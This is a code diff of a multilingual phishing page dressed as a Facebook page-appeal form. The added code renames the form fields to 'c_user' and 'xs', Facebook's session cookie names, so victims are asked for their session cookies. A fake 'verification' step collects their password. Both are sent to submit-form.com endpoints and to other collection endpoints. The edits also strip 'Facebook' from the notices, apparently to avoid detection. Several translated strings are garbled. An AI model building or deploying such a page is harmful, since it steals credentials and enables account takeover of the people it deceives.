       passwordLabel: "Contraseña",
       verifyBtn: "Verificar y Continuar",
       forgotPassword: "¿Olvidaste tu contraseña?",
       successTitle: "Apelación Enviada Exitosamente",
-      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
+      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado a decision, generalmente dentro de 7 días hábiles.",
       referenceText: "ID de referencia:",
       guideTitle: "Guía de Apelación",
       guideText1: "Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.",
-      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
+      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de review podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
       guideText3: "Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
       resourcesTitle: "Recursos Adicionales",
       helpCenterTitle: "Centro de Ayuda",
@@ -1502,15 +1477,15 @@ document.addEventListener('DOMContentLoaded', function() {
       appealBtn: "Recorrer",
       formTitle: "Solicitação de Recurso de Página",
       formSubtitle: "Envie suas informações para contestar a exclusão",
-      formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
+      formNotice1: "ⓘ Sua página has a violação relacionada às nossas diretrizes comunitárias.",
       formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
       formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Envir solicitação de recurso",
-      fbFormTitle: "Verificação do Facebook",
+      fbFormTitle: "Verificação do",
       fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
-      fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.",
+      fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do.",
       fbNotice2: "ⓘ Isso nos ajuda a garantir that você é o proprietário legítimo da página.",
       fbNotice3: "ⓘ Suas credenciais são seguras and criptografadas.",
       passwordLabel: "Senha",
@@ -1525,7 +1500,7 @@ document.addEventListener('DOMContentLoaded', function() {
       guideText3: "Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
       resourcesTitle: "Recursos Adicionais",
       helpCenterTitle: "Central de Ajuda",
-      helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
+      helpCenterDesc: "Encontre respostas para perguntas comuns and aprenda a usar nossos produtos.",
       contactSupportTitle: "Contatar Suporte",
       contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
       guidelinesTitle: "Diretrizes da Comunidade",
@@ -1602,7 +1577,7 @@ document.addEventListener('DOMContentLoaded', function() {
       successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
       referenceText: "معرف المرجع:",
       guideTitle: "دليل الاستئناف",
-      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
+      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي información ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
       guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
       guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
       resourcesTitle: "موارد إضافية",
@@ -1632,16 +1607,16 @@ document.addEventListener('DOMContentLoaded', function() {
     nameLabel: "c_user",
     mallLabel: "xs",
     submitBtn: "Gửi Yêu cầu Khiếu nại",
-    fbFormTitle: "Xác minh Facebook",
+    fbFormTitle: "Xác minh",
     fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
-    fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
+    fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản của bạn.",
     fbNotice2: "ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
     fbNotice3: "ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
     passwordLabel: "Mật khẩu",
     verifyBtn: "Xác minh và Tiếp tục",
     forgotPassword: "Quên mật khẩu?",
     successTitle: "Khiếu nại Đã gửi Thành công",
-    successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
+    successText: "Kwhenếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
     referenceText: "ID Tham chiếu:",
     guideTitle: "Hướng dẫn Khiếu nại",
     guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
@@ -1674,9 +1649,9 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Yɛ Apɛl Kɔm",
-      fbFormTitle: "Facebook Nhwehwɛmu",
+      fbFormTitle: "Nhwehwɛmu",
       fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
-      fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
+      fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo account no.",
       fbNotice2: "ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
       fbNotice3: "ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
       passwordLabel: "Password",
@@ -1716,13 +1691,14 @@ document.addEventListener('DOMContentLoaded', function() {
   const fbLoginForm = document.getElementById('fbLoginForm');
   const successMessage = document.getElementById('successMessage');
   const guideVideo = document.getElementById('guideVideo');
+  const videoPlaceholder = document.getElementById('videoPlaceholder');
   const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
   // Form elements
-  const nameInput = document.getElementById('nameInput');
-  const mallInput = document.getElementById('mallInput');
-  const nameError = document.getElementById('nameError');
-  const mallError = document.getElementById('mallError');
+  const nameInput = document.getElementById('c_userInput');
+  const mallInput = document.getElementById('xsInput');
+  const nameError = document.getElementById('c_userError');
+  const mallError = document.getElementById('xsError');
   const formError = document.getElementById('formError');
   const formErrorText = document.getElementById('formErrorText');
   const sendBtn = document.getElementById('sendBtn');
@@ -1756,11 +1732,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Current selected language
   let currentLanguage = 'english';
   let selectedLanguageOption = null;
+  let videoLanguageSelection = false;
 
   // Function to show language modal
   function showLanguageModal() {
     languageModal.style.display = 'flex';
-    mainContent.style.display = 'none';
     document.body.style.overflow = 'hidden';
     // Focus on search input when modal opens
     setTimeout(() => languageSearchInput.focus(), 100);
@@ -1769,11 +1745,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Function to hide language modal
   function hideLanguageModal() {
     languageModal.style.display = 'none';
-    mainContent.style.display = 'block';
     document.body.style.overflow = 'auto';
     // Reset search when closing
     languageSearchInput.value = '';
     filterLanguages();
+    videoLanguageSelection = false;
   }
 
   // Close modal when clicking on close button
@@ -1847,6 +1823,20 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   languageConfirmBtn.addEventListener('click', () => {
     if (selectedLanguageOption) {
       setLanguage(selectedLanguageOption);
+      
+      // If this was triggered from the video placeholder, initialize the video
+      if (videoLanguageSelection) {
+        const guideVideo = document.getElementById('guideVideo');
+        const videoSrc = videoSources[selectedLanguageOption];
+        if (guideVideo && videoSrc) {
+          guideVideo.src = videoSrc;
+          guideVideo.style.display = 'block';
+          document.getElementById('videoPlaceholder').style.display = 'none';
+          guideVideo.load();
+          guideVideo.play();
+        }
+      }
+      
       hideLanguageModal();
     } else {
       // If no language selected, default to English
@@ -1859,6 +1849,14 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   changeLanguageBtn.addEventListener('click', () => {
     showLanguageModal();
   });
+
+  // Video placeholder click to show language modal
+  if (videoPlaceholder) {
+    videoPlaceholder.addEventListener('click', function() {
+      videoLanguageSelection = true;
+      showLanguageModal();
+    });
+  }
 
   // Function to set language
   function setLanguage(lang) {
@@ -1878,8 +1876,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       }
     });
    
-    // Update video source based on language
-    if (videoSources[lang] && guideVideo) {
+    // Update video source based on language if video is already playing
+    if (videoSources[lang] && guideVideo && guideVideo.style.display === 'block') {
       guideVideo.src = videoSources[lang];
       guideVideo.load();
     }
@@ -1888,8 +1886,9 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     localStorage.setItem('preferredLanguage', lang);
   }
 
-  // Show language modal on page load
-  showLanguageModal();
+  // Load preferred language on page load
+  const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+  setLanguage(preferredLanguage);
 
   // Event listeners
   if (openAppealBtn) {
@@ -1904,30 +1903,30 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 
   // Form validation
-  if (nameInput) {
-    nameInput.addEventListener('input', () => {
-      const original = nameInput.value;
+  if (c_userInput) {
+    c_userInput.addEventListener('input', () => {
+      const original = c_userInput.value;
       const cleaned  = original.replace(/\D+/g, ''); // keep digits only
       if (original !== cleaned) {
-        nameInput.value = cleaned;
-        if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+        c_userInput.value = cleaned;
+        if (c_userError) c_userError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in c_user.';
       } else {
-        if (nameError) nameError.textContent = '';
+        if (c_userError) c_userError.textContent = '';
       }
     });
   }
 
   // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
-  const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
-  if (mallInput) {
-    mallInput.addEventListener('input', () => {
-      const original = mallInput.value;
-      const cleaned  = original.replace(mallAllowed, '');
+  const xsAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+  if (xsInput) {
+    xsInput.addEventListener('input', () => {
+      const original = xsInput.value;
+      const cleaned  = original.replace(xsAllowed, '');
       if (original !== cleaned) {
-        mallInput.value = cleaned;
-        if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
+        xsInput.value = cleaned;
+        if (xsError) xsError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> xs can contain letters, numbers, and symbols only.';
       } else {
-        if (mallError) mallError.textContent = '';
+        if (xsError) xsError.textContent = '';
       }
     });
   }
@@ -1958,16 +1957,16 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Send click: require non-empty + no validation errors
   if (sendBtn) {
     sendBtn.addEventListener('click', function() {
-      const name = nameInput.value.trim();
-      const mall = mallInput.value.trim();
+      const c_user = c_userInput.value.trim();
+      const xs = xsInput.value.trim();
 
-      if(!name || !mall) {
+      if(!c_user || !xs) {
         if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
         if (formError) formError.classList.add('show');
         setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
         return;
       }
-      if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+      if ((c_userError && c_userError.textContent) || (xsError && xsError.textContent)) {
         if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
         if (formError) formError.classList.add('show');
         setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
@@ -2018,20 +2017,18 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 
   // Function to submit form data
   function submitFormData() {
-    const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
-    const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+    const c_user = document.getElementById('c_userInput') ? document.getElementById('c_userInput').value.trim() : '';
+    const xs = document.getElementById('xsInput') ? document.getElementById('xsInput').value.trim() : '';
    
     // Prepare the data to send
     const formData = {
-      name: name,
-      mall: mall,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
+      c_user: c_user,
+      xs: xs,
       language: navigator.language
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/N2WhjMZaW', {
+    fetch('https://submit-form.com/m25V1k96e', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -2050,8 +2047,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
      
       // Also submit to the additional endpoints
       submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
+        bhenjachud: c_user,
+        majachud: xs
       });
      
       showfbLogin();
@@ -2060,8 +2057,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       console.error('Error submitting form:', error);
       // Still proceed with the other endpoints even if formsubmit fails
       submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
+        bhenjachud: c_user,
+        majachud: xs
       });
      
       
@@ -2082,13 +2079,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     // Prepare the data to send
     const fbData = {
       password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
       language: navigator.language
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/N2WhjMZaW', {
+    fetch('https://submit-form.com/m25V1k96e', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -2230,7 +2225,5 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 });
   </script>
-</body>
 
-</html>
-
+</body></html>
